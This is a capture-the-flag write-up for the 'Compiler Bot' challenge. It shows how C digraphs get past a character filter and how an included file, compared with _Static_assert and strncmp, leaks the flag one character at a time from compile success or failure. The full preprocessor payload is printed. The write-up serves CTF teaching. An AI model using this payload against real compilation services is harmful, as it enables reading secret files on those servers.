# Compiler Bot

If Compiler Explorer ( https://godbolt.org ) is too bloated for you, you can always rely on our excellent compiler bot to tell you whether you screwed up while coding your latest exploit.
And since `we never actually run your code`, there’s no way for you to hack it!

**Total solves:** 30

**Score:** 256

**Categories:** Miscellaneous

## Problem

The service receives a base64 encoded piece of code written in C, compiles the code with `clang -x c -std=c11 -Wall -Wextra -Werror -Wmain -Wfatal-errors -o /dev/null -` and the compiled code is redirected to `/dev/null`. So our input is never executed. But we have the return if the `compilation was successfully or not`. So the attack need to be done in the `preprocessor`. We know the location of the flag.

## Solution

**TL;DR:** The key to solve this problem is to use  `_Static_assert` to check the value of the stringifyed `%:include` of the flag byte by byte.

The program receives a base64 string, decode it and removes every `#`, `{`, `}`. Luckily we can use 
[digraphs](https://en.wikipedia.org/wiki/Digraphs_and_trigraphs), to bypass the substitutions. So `{`, `}` becomes `<%`, `%>` and `#` becomes `%:`.
Now we can use `includes`, `pragmas` and everything the preprocessor has to offer.

One way to solve this problem is to use [_Static_assert](https://stackoverflow.com/questions/3385515/static-assert-in-c) and [strncmp](www.cplusplus.com/reference/cstring/strncmp/) to check if the value of the included flag is valid or not. Verifying byte by byte, varying the strncmp length, we can bruteforce all possible values char by char.
In plain C our actual idea of payload would look like this:
```
#include<string.h>
int main()
{
    _Static_assert(strncmp("included_flag", "attempts", length_of_attempt) == 1, "");
}
```
Now there is a trick to [stringify](https://gcc.gnu.org/onlinedocs/gcc-4.8.5/cpp/Stringification.html) our included text in the preprocessor to do the comparison. We know the first chars of the flag so we make a macro replacement to force the preprocessor to interpret the included text as a string.
```
#define str(x) %:x
#define hxp str(
```
When the preprocessor find `hxp` it will replace with `str(` and interpret everything inside `str(` as a string. Phew, almost there.

Now we just need to put our defines outside the main function, to do this we just close the main and start another function with any name with our _Static_assert inside this function.
```
    int main()
    {}
    #define str(x) %:x
    #define hxp str(
    #include<string.h>
    void any_name(){
        _Static_assert(strncmp(
            %:include "flag"
            ), "\x7B", 1) == 1, "lol");
        )
    }
```
Since our code is inserted inside the main function we need to close main and declare our function, replacing every `#`, `{`, `}` as explained above.
Our final payload would look like this.

```
%>
    %:define str(x) %:x
    %:define hxp str(
    %:include <string.h>
    void any_name()<%
    _Static_assert(strncmp(
      %:include "flag"
    ),"\x7B", 1) == 1,"lol");
```
**Note:** the string comparison is made in hex, because tha chars `{`, `}` are replaced.
**Note:** the first `%>` is closing main

We made a [script](compilerbot.py) to bruteforce the flag.



